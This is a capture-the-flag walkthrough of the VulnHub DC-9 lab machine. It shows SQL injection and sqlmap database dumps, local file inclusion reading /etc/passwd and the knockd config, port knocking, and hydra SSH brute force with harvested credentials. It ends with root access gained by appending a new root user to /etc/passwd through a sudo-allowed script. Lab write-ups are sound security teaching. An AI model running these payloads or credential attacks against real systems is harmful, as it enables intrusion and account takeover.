***Target: 10.0.0.38***  
***Difficulty: Medium***  
***Source: https://www.vulnhub.com/entry/dc-9,412/***

## ***NMAP***

    $ nmap -sS -T4 -p- 10.0.0.38

    PORT   STATE    SERVICE
    22/tcp filtered ssh
    80/tcp open     http

SSH is filtered, my guess is we are gonna need to use a proxy or reverse shell from the site hosted on the web server in order to get access to the machine.

## ***HTTP***

![image](https://user-images.githubusercontent.com/76552238/159251710-e435074b-978f-493b-a36b-f46a9c94d80d.png)


Going to ***http://10.0.0.38***, we have a couple of pages.

![image](https://user-images.githubusercontent.com/76552238/159251755-e9b6b7bf-e775-4b83-b4f6-4d488e0d892a.png)

![image](https://user-images.githubusercontent.com/76552238/159251806-64afcca9-5670-443f-b1d8-e4e62112d58a.png)

We have a login page and a search page. 

When passing ***' OR 1=1 #*** in the search query we can see all of the available results. 

![image](https://user-images.githubusercontent.com/76552238/159251940-90ed3642-43fe-40fc-94fd-3b30a66fe3b9.png)

![image](https://user-images.githubusercontent.com/76552238/159251999-a3cf9f93-c14f-4bc6-ad5c-6064a4f05659.png)
![image](https://user-images.githubusercontent.com/76552238/159252041-68f5c9c0-994d-4144-afaa-dcfb1e99c742.png)

This means ***http://10.0.0.38/search.php*** is vulnerable to SQLi (SQL Injection).  
This means we are going to need to use the 'sqlmap' command.

![image](https://user-images.githubusercontent.com/76552238/159252456-b47ada91-88a3-4d92-8f46-e508dd89f1e7.png)

Since the search doesn't send a GET request and takes arguments from the url, we are going to need to download the 'results.php' using Burp Suite and use 'sqlmap' on it.

![image](https://user-images.githubusercontent.com/76552238/159253323-2201f765-7978-4332-98c6-456688485c4e.png)

    $ sqlmap -r sqli.txt --dbs --batch

![image](https://user-images.githubusercontent.com/76552238/159254220-8b5349a7-d06f-4944-9d2b-45d9974a4c4a.png)

Let's enumerate the 'users' database.

    $ sqlmap -r sqli.txt -D users --tables --columns --dump

![image](https://user-images.githubusercontent.com/76552238/159254378-2ae30d95-e066-4481-bab3-ee9d53fc4523.png)

    $ sqlmap -r results.txt -D Staff --tables --columns --dump

![image](https://user-images.githubusercontent.com/76552238/159254639-bcb0fa36-9322-43cf-aaf2-066d1e2252b8.png)

The password seems to be hashed, let's see if we can crack it.

![image](https://user-images.githubusercontent.com/76552238/159254866-0a2ac8e4-7580-4a22-990e-b3979f4b6397.png)

<!--Hash crack: transorbital1-->

We now have the credentials in order to be able to log into the site.

![image](https://user-images.githubusercontent.com/76552238/159255011-26343b8f-45e0-4c93-82ff-337d13b3febc.png)

![image](https://user-images.githubusercontent.com/76552238/159255042-55926749-ce57-4550-b5bd-5c49cac6a2b8.png)

After logging in as the user 'admin' we can see that ***http://10.0.0.38/manage.php*** shows and error.

![image](https://user-images.githubusercontent.com/76552238/159255092-ab5a32ba-972b-400d-bb53-a21614b82dfc.png)

This might be an indicator that this page is vulnerable to LFI (Local File Inclusion).

Let's try using 'file' as the parameter name.  
***http://10.0.0.38/manage.php?file=../../../../../../etc/passwd***

![image](https://user-images.githubusercontent.com/76552238/159257886-5d3c83a7-0d5a-4dc7-9431-241132d8ff94.png)

Now at this point I got a little stuck I didn't know what files to read. So I traced my steps and saw that SSH is filtered, this might be a sign that we should use Port Knocking (A method of externally opening ports on a firewall by generating a connection attempt on a set of prespecified port. The primary purpose of Port Knocking is to prevent an attacker from scanning a system for potentially exploitable services by doing a port scan, because unless the attacker sends the correct knock sequence, the protected ports will appear closed, our in our case filtered).   

Turns out when Port Knocking is enabled, it must have a config file at '***/etc/knockd.conf***' ---> ***https://www.tecmint.com/port-knocking-to-secure-ssh/***

So let's see if the file exists.

***http://10.0.0.38/manage.php?file=../../../../../../etc/knockd.conf***:

![image](https://user-images.githubusercontent.com/76552238/159258133-46e36618-c5c4-4a98-ba35-394ded5bdd28.png)

<!--[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn -->

The ports are [7468, 8475, 9842].  
We can use the command 'knock' that allows use to Port Knock ports on the machine.

    $ knock 10.0.0.38 7469 8475 9842
    $ nmap -sS -T4 -p- 10.0.0.38

![image](https://user-images.githubusercontent.com/76552238/159258301-c87a1fea-73b7-4cf2-a770-7b8be4333c37.png)

SSH is open :) . We can now brute force the SSH login using the credentials we found in the SQL database.

    $ hydra -L users.txt -P passwords.txt ssh://10.0.0.38 -IV

![image](https://user-images.githubusercontent.com/76552238/159258865-b15c5956-2cb8-42b2-9d12-b71abb1ba837.png)

![image](https://user-images.githubusercontent.com/76552238/159258892-856a0a0b-838f-4d45-a629-ed3bbb622239.png)

![image](https://user-images.githubusercontent.com/76552238/159258927-3d27e536-a4d4-4dd1-8334-2e19ddf5bbda.png)

## ***PRIVILEGE ESCALATION***

I logged in as the user 'joeyt' and found nothing in his home directory, he also is not able to run sudo on the machine. 

![image](https://user-images.githubusercontent.com/76552238/159259109-05ce9f9d-2a28-431d-86f3-c01e74d569b2.png)

The user 'chandlerb' was the same story. But the user 'janitor' had a secret directory for Putin that held a couple of passwords.

![image](https://user-images.githubusercontent.com/76552238/159259234-0958a94f-b758-4fd9-869f-c330c170c298.png)

### ***/home/janitor/.secrets-for-putin/passwords-found-on-post-it-notes.txt:***

    BamBam01
    Passw0rd
    smellycats
    P0Lic#10-4
    B4-Tru3-001
    4uGU5T-NiGHts

One of this passwords must be for another user we found in the sql database.
Let's brute force SSH once again.

    $ hydra -L users.txt -P passwords-found-on-post-it-notes.txt ssh://10.0.0.38 -IV

![image](https://user-images.githubusercontent.com/76552238/159259466-dc7a61c5-bbde-480b-a993-7caf3eb4fbc6.png)

    $ sudo -l

    User fredf may run the following commands on dc-9:
        (root) NOPASSWD: /opt/devstuff/dist/test/test

After logging as the user 'fredf' and checking his root permissions we find our that the user 'fredf' can run the file ***/opt/devstuff/dist/test/test*** as root.

    $ /opt/devstuff/dist/test/test

![image](https://user-images.githubusercontent.com/76552238/159259713-dd24ff58-3e4a-439f-8d40-26ab5502f24b.png)

Let's try to find a file on the machine by the name of 'test.py'.

    $ find / -name test.py 2> /dev/null

![image](https://user-images.githubusercontent.com/76552238/159259867-43e62441-07ca-4625-b282-cfa2d5f998a8.png)

We can read the script:

    $ cat /opt/devstuff/test.py

    #!/usr/bin/python

    import sys

    if len (sys.argv) != 3 :
        print ("Usage: python test.py read append")
        sys.exit (1)

    else :
        f = open(sys.argv[1], "r")
        output = (f.read())

        f = open(sys.argv[2], "a")
        f.write(output)
        f.close()

After running the command ***/opt/devstuff/dist/test/test*** it outputs out the syntax for the command ***/opt/devstuff/test.py***. After finding and reading it, we can find out that the command adds (appends) the content of the first file onto the second file, the same as '>>'.

    e.g. test1.txt = "Hello World", test2.txt = "Linux is better then Windows"
    /opt/devstuff/dist/test/test test1.txt test2.txt
    test2.txt = Hello World\nLinux is better then Windows

I played with it a bit and we can't add our own exploit to ***/opt/devstuff/dist/test/test***. We also can't add some malicious python code to ***/opt/devstuff/test.py***.

I searched online for "linux edit files for privilege escalation" and found this article that shows we can add a new line to the ***/etc/passwd*** file and thus create a new user with root permissions ---> ***https://infinitelogins.com/2021/02/24/linux-privilege-escalation-weak-file-permissions-writable-etc-passwd/***

By coping the line of the root user in ***/etc/passwd*** (root:x:0:0:root:/root:/bin/bash) and adding a generated password using 'openssel', we can add a new line to ***/etc/passwd*** on the remote machine and add a new user with root permissions.

    Local Machine:
    
    $ openssl passwd newpassword

    Warning: truncating password to 8 characters
    AwDy7JH2.fkcQ

>

    Remote Machine:

![image](https://user-images.githubusercontent.com/76552238/159260997-6ee83b69-8847-40c0-9ffe-d1b208573795.png)

## ***/root/theflag.txt:***

![image](https://user-images.githubusercontent.com/76552238/159261835-c0b3825f-98f9-4bc3-a9d3-4cdacad1b831.png)

By getting a shell as root and the final flag we finished the CTF.
